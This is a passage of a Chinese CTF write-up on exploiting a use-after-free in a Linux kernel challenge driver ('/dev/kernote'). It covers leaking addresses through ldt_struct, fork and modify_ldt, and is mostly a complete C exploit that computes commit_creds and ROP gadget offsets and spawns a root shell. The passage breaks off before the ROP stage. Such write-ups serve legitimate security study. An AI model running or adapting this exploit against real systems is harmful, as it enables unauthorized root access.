<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟踪 fd_array 字段，即结构体 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fs.h#L915"><code>file</code></a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span>	<span class="token operator">*</span>f_op<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span> __randomize_layout
  <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">/* lest something weird decides that 2 is OK */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读取 f_op 指针即可获取到内核地址</p>
<h4 id="Safe-Leak"><a href="#Safe-Leak" class="headerlink" title="Safe Leak"></a>Safe Leak</h4><p>直接搜索整个线性映射区域仍有可能触发 <strong>HARDENED_USERCOPY</strong> 的检查，官方利用 fork 时，调用 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L443"><code>ldt_dup_context</code></a> 拷贝 ldt 来安全的 leak 数据</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * Called on fork from arch_dup_mmap(). Just copy the current LDT state,
 * the new task is not running, so nothing can be installed.
 */</span>
<span class="token keyword">int</span> <span class="token function">ldt_dup_context</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>old_mm<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>new_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span>
	       new_ldt<span class="token operator">-></span>nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为这里使用的是 memcpy，发生在内核空间内的拷贝，并不会有 HARDENED_USERCOPY 检查，只要再父进程 UAF 修改 entries，fork 后子进程进行 read_ldt，即可安全的进行任意地址读</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// child</span>
        <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token function">safe_read</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>有了内核地址后，再次构造 UAF 劫持 <strong>seq_operations</strong>，利用 <strong>pt_regs</strong> 进行 ROP 即可</p>
<p>具体参考：<br><a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3">https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3</a></p>
<h3 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -masm=intel -pthread -static -o exp exp.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;asm/ldt.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>

<span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error at: \033[0m%s\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>
            <span class="token string">"mov user_ss, ss;"</span>
            <span class="token string">"mov user_sp, rsp;"</span>
            <span class="token string">"pushf;"</span>
            <span class="token string">"pop user_rflags;"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>   
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Backing from the kernelspace.\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Failed to get the root!\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// to exit the process normally instead of segmentation fault</span>
<span class="token punctuation">&#125;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_DELETE</span> <span class="token expression"><span class="token number">0x6668</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_SELECT</span> <span class="token expression"><span class="token number">0x6666</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_ADD</span> <span class="token expression"><span class="token number">0x6667</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_EDIT</span> <span class="token expression"><span class="token number">0x6669</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_NOUSE</span> <span class="token expression"><span class="token number">0x666A</span></span></span>


<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
<span class="token keyword">int</span> seq_fd<span class="token punctuation">;</span>
<span class="token keyword">int</span> pid<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
<span class="token class-name">uint64_t</span> page_offset_base <span class="token operator">=</span> <span class="token number">0xffff888000000000uLL</span><span class="token punctuation">;</span>
<span class="token class-name">uint64_t</span> kernel_base<span class="token punctuation">,</span> kernel_offset<span class="token punctuation">;</span>
<span class="token class-name">uint64_t</span> pop_rdi_ret<span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">,</span> init_cred<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// child</span>
        <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">struct</span> <span class="token class-name">user_desc</span> desc<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> tmp<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> search_addr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> files_addr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> file0_addr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> f_op_addr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>comm_addr<span class="token punctuation">;</span>
    <span class="token keyword">int</span> cur_pid<span class="token punctuation">;</span>

    <span class="token class-name">cpu_set_t</span> cpu_mask<span class="token punctuation">;</span>
    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"mmap error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kernote"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open device"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"creating UAF..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    desc<span class="token punctuation">.</span>base_addr<span class="token operator">=</span><span class="token number">0xff0000</span><span class="token punctuation">;</span>
    desc<span class="token punctuation">.</span>entry_number<span class="token operator">=</span><span class="token number">0x8000</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>

    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"searching page_offset_base..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            page_offset_base <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span>  <span class="token comment">// direct mapping size = 1G</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"page_offset_base = %#lx\n"</span><span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NAME<span class="token punctuation">,</span> <span class="token string">"xi4oyu2333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    search_addr <span class="token operator">=</span> page_offset_base<span class="token punctuation">;</span>
    files_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cur_pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">safe_read</span><span class="token punctuation">(</span>search_addr<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        comm_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memmem</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> <span class="token string">"xi4oyu2333"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>comm_addr <span class="token operator">&amp;&amp;</span>
        comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">></span> page_offset_base <span class="token operator">&amp;&amp;</span>
        comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">></span> page_offset_base <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> cur_pid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            files_addr <span class="token operator">=</span> comm_addr<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"found files %#lx\n"</span><span class="token punctuation">,</span> files_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        search_addr <span class="token operator">+=</span> <span class="token number">0x8000</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files->fd_array[0]..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">safe_read</span><span class="token punctuation">(</span>files_addr<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    file0_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">160</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>file0_addr <span class="token operator">></span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"file0 addr error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"file0 addr %#lx\n"</span><span class="token punctuation">,</span> file0_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files->file0->f_op..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">safe_read</span><span class="token punctuation">(</span>file0_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    f_op_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"f_op addr %#lx\n"</span><span class="token punctuation">,</span> f_op_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    kernel_offset <span class="token operator">=</span> f_op_addr <span class="token operator">-</span> <span class="token number">0xffffffff820b5e00</span><span class="token punctuation">;</span>  <span class="token comment">// tty_ops</span>
    kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
    commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810c9dd0</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
    prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810ca2b0</span> <span class="token operator">+</span>  kernel_offset<span class="token punctuation">;</span>
    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0xffffffff81075c4c</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
    swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81c00fb0</span> <span class="token operator">+</span> kernel_offset <span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>
    init_cred <span class="token operator">=</span> <span class="token number">0xffffffff8266b780</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kernel_base = %#lx\n"</span><span class="token punctuation">,</span> kernel_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kernel_offset = %#lx\n"</span><span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"commit_creds = %#lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred = %#lx\n"</span><span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>

    
